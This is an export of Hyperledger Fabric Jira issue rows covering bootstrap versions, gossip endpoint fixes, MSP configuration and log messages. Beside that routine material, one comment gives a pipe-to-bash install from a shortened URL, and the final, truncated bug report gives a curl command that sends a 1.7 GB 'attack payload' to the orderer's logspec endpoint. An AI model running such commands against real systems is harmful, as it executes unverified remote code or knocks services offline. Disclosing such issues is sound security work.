If it is no longer supported other than a critical issue about versioned branch, I think we need to provide an environment where users can change versions for future users.",,btl5037,Specia1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01dbv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,Specia1,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"22/Jun/20 12:59 AM;btl5037;Fabric-Samples is not meant to be setup manually (though you can do it). It is meant to be configured in its current state using the bootstrapper, which allows the user to specify the versions of dependencies they want to use: [https://github.com/hyperledger/fabric/blob/master/scripts/bootstrap.sh]

So you bootstrap fabric samples by running:

`curl -sSL https://bit.ly/2ysbOFE | bash -s -- 2.0.1 1.4.6 0.4.18`

Which allows you to specify what version of the fabric images, the CA and the other images you want. You can always rerun the script to get different dependencies.

If someone really wanted to modify the image, they would need only change the `.env` files to specify a different tag. But this requires you to swap out all of the binary, config files, images, for the correct versions, and checkout a compatible tag of fabric-samples.;;;","19/Jul/20 12:42 PM;Specia1;Using the bootstrap script, I understand that using IMAGE_TAG as latest in fabric-samples does not have any problems, because I make the desired version of the docker image as latest.

 

Thanks a lot!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
main.go code hygiene,FAB-18013,45317,40570,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tock,tock,tock,18/Jun/20 6:06 PM,21/Jun/20 7:01 PM,28/Oct/23 3:10 AM,21/Jun/20 7:01 PM,,,,,,,,,,v2.x,,,,fabric-orderer,,,,,,,,,0,,,,,,Move timeout default override to onboarding,,tock,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01dc3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove BYFN Tutorial in 2.2,FAB-18014,45333,44479,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,negupta,negupta,19/Jun/20 12:28 AM,30/Jun/20 12:12 AM,28/Oct/23 3:10 AM,30/Jun/20 12:12 AM,,,,,,,,,,,,,,fabric-docs,,,,,,,,,0,,,,,,,,negupta,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01dff:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),negupta,pandrejko,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"29/Jun/20 11:55 PM;pandrejko;PR: [https://github.com/hyperledger/fabric/pull/1486]
 [https://github.com/hyperledger/fabric/pull/1485];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove First Network sample in Fabric 2.2,FAB-18015,45334,44479,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,,negupta,negupta,19/Jun/20 12:29 AM,27/Jun/20 2:20 AM,28/Oct/23 3:10 AM,27/Jun/20 2:20 AM,,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,https://github.com/hyperledger/fabric-samples/tree/master/first-network,,denyeart,negupta,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01dfn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,negupta,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jun/20 2:20 AM;denyeart;https://github.com/hyperledger/fabric-samples/pull/214;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Maintain revision for couchdb docs in channel metadata (such as savepoint doc),FAB-18017,45444,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,manish-sethi,manish-sethi,23/Jun/20 7:42 AM,09/Nov/20 11:18 PM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"Peer causes an additional call to couchdb at each block commit for pulling the latest `rev` of the doc in which we maintain the save point for the  channel. The latest `rev` is already returned when we write the doc. So, this can easily be avoided by maintaining the `rev` in memory.",,manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0p",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),manish-sethi,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Peers in integration tests cannot communicate intra-org,FAB-18018,45452,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wenjian,yacovm,yacovm,23/Jun/20 10:15 PM,11/Jul/20 12:25 AM,28/Oct/23 3:10 AM,11/Jul/20 12:25 AM,,,,,,,,,,,,,,fabric-gossip,fabric-test,,,,,,,,0,,,,,,"due to internal addresses being computed as non-loopback address, therefore we have 2 problems:

* The integration test core template sets the bind address to be the loopback only, hence the packets don't arrive when peers use non loopback addresses
* The SAN that the integration tests generate only use loopback so even if the TCP packets arrive, the TLS handshake will still fail.

We need to consider not setting the autoDetect in the core template to make the peer only use loopback. ",,sykesm,wenjian,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i00wur:0idqk",,,,Unset,Unset,v2.x,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),sykesm,wenjian,yacovm,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jun/20 4:57 AM;sykesm;In the side chat you pointed to a commit that no longer exists so I can't observe the problem.

On loopback:
* Integration tests use peers that all run on the same host so the loopback adapter should be fine to use for any peer to peer communication.
* Listening on the loopback adapter has been preferred to avoid some of the issues we've seen running tests on development machines with an active firewall.
* Disabling {{peer.autoDetect}} impacts chaincode running in docker containers from accessing the peer's chaincode endpoint which is configured to run on INADDR_ANY.

If this is related to gossip, why not just set {{peer.gossip.endpoint}} explicitly to loopback? It overrides the auto-detected peer address.

{code}
diff --git a/integration/nwo/core_template.go b/integration/nwo/core_template.go
index 29df215bc..17fd4554e 100644
--- a/integration/nwo/core_template.go
+++ b/integration/nwo/core_template.go
@@ -30,7 +30,7 @@ peer:
     useLeaderElection: true
     orgLeader: false
     membershipTrackerInterval: 5s
-    endpoint:
+    endpoint: 127.0.0.1:{{ .PeerPort Peer ""Listen"" }}
     maxBlockCountToStore: 100
     maxPropagationBurstLatency: 10ms
     maxPropagationBurstSize: 10
{code}

We already set the {{peer.gossip.bootstrap}} and {{peer.gossip.externalEndpoint}} to loopback for similar reasons.;;;","24/Jun/20 5:28 AM;yacovm;{quote}If this is related to gossip, why not just set peer.gossip.endpoint explicitly to loopback? It overrides the auto-detected peer address.
{quote}
It's *not* related to gossip, it is related to the endpoint being computed *improperly* when *auto-detect* is *true*, and being passed into the gossip initialization.

Overriding via the gossip endpoint works, however this feels artificial to me, as this is seldomly used in production as far as I know, and the real problem here is that the peer computes a non-loopback address instead of the loopback it should have been, and passes this into gossip.

[It seems to me|https://github.com/hyperledger/fabric/blob/9fabf569a7f4a0b161a6cbed19b1de6cc81db6af/core/peer/config.go#L313-L342] that if we have *auto-detect* set to *true*, and *peer.address* set to *127.0.0.1* then the *auto-detect* gets preference over the explicit *127.0.0.1*. 
 Do you think this makes sense? I am not sure it does, as if I configured _*explicitly*_ an address why should the *auto-detect* override it? If I wanted *auto-detect* to be used I would have left the *peer.address* empty, no?

[~sykesm] [~denyeart] wdyt?;;;","24/Jun/20 6:56 AM;sykesm;I think you're trying to stir up trouble. :) The auto-detect [behavior|https://github.com/hyperledger/fabric/blob/66f97e4025fd3e99e265ce2ecd802e53f05209d6/core/peer/config.go#L61-L96] has always taken precedence over {{peer.address}}. It appears it's been this way since before 1.0. 

Is it how I would have implemented it? No.
Is it right? Probably not, but it's another behavior that's been around long enough to be a ""feature"" of fabric. ""Fixing"" this is likely to cause just as much pain as leaving it alone.

In production environments, if they're not running with the default behavior of listening on all adapters and auto-detecting the address, they should be specifying both the address (ie. the advertise address) and the listen addresses explicitly. This would need to be done for the peer, chaincode, and gossip.

{quote}If I wanted auto-detect to be used I would have left the peer.address empty, no?{quote}

Only if you want the default port. Plus it's [required|https://github.com/hyperledger/fabric/blob/833438fb1bf812033351cd232917c11cb17a34cb/core/peer/config.go#L314-L317]. In fact, it looks like you're the one that [made it that way|https://github.com/hyperledger/fabric/commit/df33b8212b59599b89054ff6707cb3f31f276c26].

{quote}wdyt?{quote}

I think we should leave well enough alone. The default configuration works well enough for most, the latest version of sampleconfig/core.yaml states that {{addressAutoDetect}} overrides {{peer.address}}, and minor configuration changes can be used set the advertised addresses when auto-detect is disabled.;;;","24/Jun/20 7:34 AM;yacovm;Yeah thanks for reminding me of my sins of the past, appreciate it.

 

All right, looks like we have agreement on using *gossip.endpoint* in the integration tests then.;;;","24/Jun/20 8:01 AM;yacovm;And the discussion is here [~sykesm]  [https://github.com/hyperledger/fabric/pull/1422]

 

the problem was that gossip was given the non loopback address so it tried to probe the wrong address:

{{[e][Org1.peer1] 2020-06-23 14:06:56.592 IDT [gossip.discovery] 
func1 -> DEBU 099 Endpoint: 127.0.0.1:21504, InternalEndpoint: 
192.168.1.21:21504, PKI-ID: 
ff2b9769feb64436a78c030d0d43cb051b46297850d5d1edddbf8d57a5fd400b, 
Metadata:  is still dead}};;;","29/Jun/20 10:14 PM;wenjian;To summarize, the fix is to explicitly set gossip.endpoint to use loopback address in IT: [https://github.com/hyperledger/fabric/pull/1455];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Integration test for join channel with genesis block as a member,FAB-18019,45454,45221,Sub-task,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,wlahti,wlahti,wlahti,24/Jun/20 2:50 AM,24/Jul/20 11:00 PM,28/Oct/23 3:10 AM,24/Jul/20 11:00 PM,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,Join application channel with genesis block as a member.,,tock,wlahti,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-18031,,,,,,,,,FAB-17910,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01drn:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tock,wlahti,,,,,,,,,,,,,release-2.5,release-2.4,main,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"27/Jun/20 1:15 AM;wlahti;[https://github.com/hyperledger/fabric/pull/1465];;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Add config.yaml to msp folder for User1 in test-network,FAB-18020,45455,,Bug,Closed,FAB,Fabric,software,denyeart,,,Medium,Done,tatsu-sato,tatsu-sato,tatsu-sato,24/Jun/20 3:48 AM,24/Jun/20 11:46 AM,28/Oct/23 3:10 AM,24/Jun/20 11:46 AM,v2.1.1,,,,,,,,,,,,,fabric-samples,,,,,,,,,0,,,,,,"In *fabric-samples/test-network*, an user (*User1*) is created for each org.
 When using FabricCA, the created user does not work because the *config.yaml*, which is required when enabling NodeOUs, in not placed in the *msp* folder.

The following is an example to try to use the user.
{code:bash}
./network.sh up createChannel -ca
./network.sh deployCC

export FABRIC_CFG_PATH=$PWD/../config/
export PATH=${PWD}/../bin:${PWD}:$PATH
export CORE_PEER_TLS_ENABLED=true
export CORE_PEER_LOCALMSPID=""Org1MSP""
export CORE_PEER_TLS_ROOTCERT_FILE=${PWD}/organizations/peerOrganizations/org1.example.com/peers/peer0.org1.example.com/tls/ca.crt
export CORE_PEER_MSPCONFIGPATH=${PWD}/organizations/peerOrganizations/org1.example.com/users/User1@org1.example.com/msp
export CORE_PEER_ADDRESS=localhost:7051

## Send transaction using the user (it fails)
peer chaincode query -C mychannel -n fabcar -c '{""Args"":[""queryAllCars""]}'
2020-06-22 23:06:33.152 UTC [main] InitCmd -> ERRO 001 Cannot run peer because error when setting up MSP of type bccsp from directory (..)/src/github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org1.example.com/users/User1@org1.example.com/msp: administrators must be declared when no admin ou classification is set

ls ${PWD}/organizations/peerOrganizations/org1.example.com/users/User1@org1.example.com/msp
IssuerPublicKey  IssuerRevocationPublicKey  cacerts  keystore  signcerts  user ## There is No config.yaml
{code}",,denyeart,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01drv:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,tatsu-sato,,,,,,,,,,,,,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-6.11.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/tough-cookie-4.1.3,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/semver-6.3.1,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/grpc/grpc-js-1.8.17,dependabot/go_modules/high-throughput/application-go/google.golang.org/grpc-1.53.0,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/word-wrap-1.2.4,dependabot/npm_and_yarn/asset-transfer-basic/rest-api-typescript/protobufjs-and-fabric-network-7.2.4,dependabot/go_modules/asset-transfer-basic/application-go/google.golang.org/grpc-1.53.0,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,"24/Jun/20 7:38 AM;denyeart;Thanks [~tatsu-sato] , are you going to create a PR in fabric-samples?;;;","24/Jun/20 8:18 AM;tatsu-sato;[~denyeart] 
Yes. I just submitted the PR as follows.
[https://github.com/hyperledger/fabric-samples/pull/212];;;","24/Jun/20 11:45 AM;denyeart;Thanks, merged!;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Improve log messages in msp/configbuilder.go,FAB-18021,45456,,Task,Backlog,FAB,Fabric,software,denyeart,,,Medium,,tatsu-sato,tatsu-sato,tatsu-sato,24/Jun/20 3:54 AM,24/Jun/20 5:15 PM,28/Oct/23 3:10 AM,,v2.1.1,,,,,,,,,,,,,fabric-crypto,,,,,,,,,0,,,,,,"Currently, *loadCertificateAt()* in *msp/configbuilder.go* prints warning messages when Certificate for each *OUIdentifier* is not set in *msp/config.yaml*.

An example of *msp/config.yaml*:
{code:yaml}
NodeOUs:   Enable: true
  ClientOUIdentifier:     OrganizationalUnitIdentifier: client
  PeerOUIdentifier:     OrganizationalUnitIdentifier: peer
  AdminOUIdentifier:     OrganizationalUnitIdentifier: admin
  OrdererOUIdentifier:     OrganizationalUnitIdentifier: orderer
{code}
An example of the warning messages when using the above *config.yaml*:
{code:sh}
configtxgen -profile TwoOrgsOrdererGenesis -channelID system-channel -outputBlock ./system-genesis-block/genesis.block
2020-06-23 18:25:49.972 UTC [common.tools.configtxgen] main -> INFO 001 Loading configuration
2020-06-23 18:25:49.994 UTC [common.tools.configtxgen.localconfig] completeInitialization -> INFO 002 Orderer.Addresses unset, setting to [127.0.0.1:7050]
2020-06-23 18:25:49.994 UTC [common.tools.configtxgen.localconfig] completeInitialization -> INFO 003 orderer type: etcdraft
2020-06-23 18:25:49.994 UTC [common.tools.configtxgen.localconfig] completeInitialization -> INFO 004 Orderer.EtcdRaft.Options unset, setting to tick_interval:""500ms"" election_tick:10 heartbeat_tick:1 max_inflight_blocks:5 snapshot_interval_size:16777216 
2020-06-23 18:25:49.994 UTC [common.tools.configtxgen.localconfig] Load -> INFO 005 Loaded configuration: github.com/hyperledger/fabric-samples/test-network/configtx/configtx.yaml
2020-06-23 18:25:49.994 UTC [msp] loadCertificateAt -> WARN 006 Failed loading ClientOU certificate at [github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/msp]: [could not read file github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/msp: read github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/msp: is a directory]
2020-06-23 18:25:49.994 UTC [msp] loadCertificateAt -> WARN 007 Failed loading PeerOU certificate at [github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/msp]: [could not read file github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/msp: read github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/msp: is a directory]
2020-06-23 18:25:49.994 UTC [msp] loadCertificateAt -> WARN 008 Failed loading AdminOU certificate at [github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/msp]: [could not read file github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/msp: read github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/msp: is a directory]
2020-06-23 18:25:49.994 UTC [msp] loadCertificateAt -> WARN 009 Failed loading OrdererOU certificate at [github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/msp]: [could not read file github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/msp: read github.com/hyperledger/fabric-samples/test-network/organizations/ordererOrganizations/example.com/msp: is a directory]
2020-06-23 18:25:49.995 UTC [msp] loadCertificateAt -> WARN 00a Failed loading ClientOU certificate at [github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org1.example.com/msp]: [could not read file github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org1.example.com/msp: read github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org1.example.com/msp: is a directory]
2020-06-23 18:25:49.995 UTC [msp] loadCertificateAt -> WARN 00b Failed loading PeerOU certificate at [github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org1.example.com/msp]: [could not read file github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org1.example.com/msp: read github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org1.example.com/msp: is a directory]
2020-06-23 18:25:49.995 UTC [msp] loadCertificateAt -> WARN 00c Failed loading AdminOU certificate at [github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org1.example.com/msp]: [could not read file github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org1.example.com/msp: read github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org1.example.com/msp: is a directory]
2020-06-23 18:25:49.995 UTC [msp] loadCertificateAt -> WARN 00d Failed loading OrdererOU certificate at [github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org1.example.com/msp]: [could not read file github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org1.example.com/msp: read github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org1.example.com/msp: is a directory]
2020-06-23 18:25:49.996 UTC [msp] loadCertificateAt -> WARN 00e Failed loading ClientOU certificate at [github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org2.example.com/msp]: [could not read file github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org2.example.com/msp: read github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org2.example.com/msp: is a directory]
2020-06-23 18:25:49.996 UTC [msp] loadCertificateAt -> WARN 00f Failed loading PeerOU certificate at [github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org2.example.com/msp]: [could not read file github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org2.example.com/msp: read github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org2.example.com/msp: is a directory]
2020-06-23 18:25:49.996 UTC [msp] loadCertificateAt -> WARN 010 Failed loading AdminOU certificate at [github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org2.example.com/msp]: [could not read file github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org2.example.com/msp: read github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org2.example.com/msp: is a directory]
2020-06-23 18:25:49.996 UTC [msp] loadCertificateAt -> WARN 011 Failed loading OrdererOU certificate at [github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org2.example.com/msp]: [could not read file github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org2.example.com/msp: read github.com/hyperledger/fabric-samples/test-network/organizations/peerOrganizations/org2.example.com/msp: is a directory]
2020-06-23 18:25:49.997 UTC [common.tools.configtxgen] doOutputBlock -> INFO 012 Generating genesis block
2020-06-23 18:25:49.997 UTC [common.tools.configtxgen] doOutputBlock -> INFO 013 Writing genesis block
{code}
On the other hand, the [document|https://hyperledger-fabric.readthedocs.io/en/master/msp.html#identity-classification] says that setting *Certificate* is optional and it is typical NOT to configure a specific *Certificate*.

Despite the typical setting, it may be noisy for users to always get the WARN Level log message.
 Also, it is desirable to be able to distinguish between the case where *Certificate* is not set and the case where the file is not found in the specific path.

Therefore, it is necessary to improve the log messages.",,tatsu-sato,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01ds3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),tatsu-sato,,,,,,,,,,,,,,mergify/bp/release-2.2/pr-4374,release-2.5,release-2.4,main,mergify/bp/release-2.2/pr-3750,mergify/bp/release-2.5/pr-3782,mergify/bp/release-2.4/pr-3646,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,true,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
deploy facar on org3 in TestNetwork,FAB-18022,45459,,Story,Closed,FAB,Fabric,software,denyeart,,,Highest,Invalid,,daring5920,daring5920,24/Jun/20 6:27 PM,20/Aug/20 12:38 PM,28/Oct/23 3:10 AM,20/Aug/20 12:38 PM,v2.1.1,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,,,,,,"添加org3成功

!image-2020-06-24-17-24-13-970.png!

 

!image-2020-06-24-17-27-30-642.png!

然后部署错误 

!image-2020-06-24-17-24-50-301.png!

 

请帮我！如何解决这个问题

 

谢谢",,btl5037,daring5920,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"24/Jun/20 6:24 PM;daring5920;image-2020-06-24-17-24-13-970.png;https://jira.hyperledger.org/secure/attachment/18404/image-2020-06-24-17-24-13-970.png","24/Jun/20 6:24 PM;daring5920;image-2020-06-24-17-24-50-301.png;https://jira.hyperledger.org/secure/attachment/18403/image-2020-06-24-17-24-50-301.png","24/Jun/20 6:27 PM;daring5920;image-2020-06-24-17-27-30-642.png;https://jira.hyperledger.org/secure/attachment/18402/image-2020-06-24-17-27-30-642.png",,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01dsr:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),btl5037,daring5920,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"20/Aug/20 12:38 PM;btl5037;This post would be better suited for RocketChat (chat.hyperledger.org) or the Fabric Mailing List (fabric@lists.hyperledger.org).

Jira is for reporting bugs and tracking feature requests.

Thank you.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Remove support for Kafka-based consensus,FAB-18023,45462,,Story,Backlog,FAB,Fabric,software,denyeart,,,Medium,,,denyeart,denyeart,24/Jun/20 9:08 PM,24/Jun/20 9:08 PM,28/Oct/23 3:10 AM,,,,,,,,,,,v3.0.0,,,,fabric-orderer,,,,,,,,,0,,,,,,"With the shift to Raft as the most popular consensus type in v1.4 and v2.0, support for Kafka can be removed.

Kafka was deprecated in FAB-16408.",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-16408,,,,,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,FAB-15574,,,No,,Unset,No,,,"1|i01dtf:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Peer node rollback - make option to pause endorsement configurable (for backup/restore and other scenarios),FAB-18024,45465,,Story,Closed,FAB,Fabric,software,denyeart,,,Medium,Won't Do,,denyeart,denyeart,24/Jun/20 11:28 PM,05/Sep/20 4:21 AM,28/Oct/23 3:10 AM,05/Sep/20 4:21 AM,,,,,,,,,,,,,,fabric-ledger,,,,,,,,,0,operator,,,,,"Currently rollback pauses the endorsement til peer reaches the previously highest-ever-seen height.

In some scenarios this may not be desired. For example if orderers are restored from a backup, the peers will never reach their previously highest-ever-seen height, and therefore they must continue to endorse to avoid deadlock.",,denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,FAB-17807,FAB-15810,,,,,,,,,,,,,,,,,,,,,,(Please add high level design or a link to the design),Unset,Unset,Unset,,,,,No,,Unset,No,,,"1|i01du3:",,,,Unset,Unset,,(Please add steps to reproduce),,Unset,,,,,,Unset,,Unset,,(Please add usage information),denyeart,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"05/Sep/20 4:21 AM;denyeart;We decided not to pursue a backup scenario where peers are rolled back, closing.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
potential DDoS of Orderer via config,FAB-18025,45470,,Bug,Unverified,FAB,Fabric,software,denyeart,,,High,,denyeart,ryjones,dhuseby,25/Jun/20 12:08 PM,01/Oct/21 3:15 AM,28/Oct/23 3:10 AM,,,,,,,,,,,,,,,,,,,,,,,,0,,,,,,"*How to reproduce:*
The attachment is the attack payload (about 1.7G after unzip), use the following command line:
         *curl -X PUT ""[http://localhost:8443/logspec]""  -d @payload.txt*
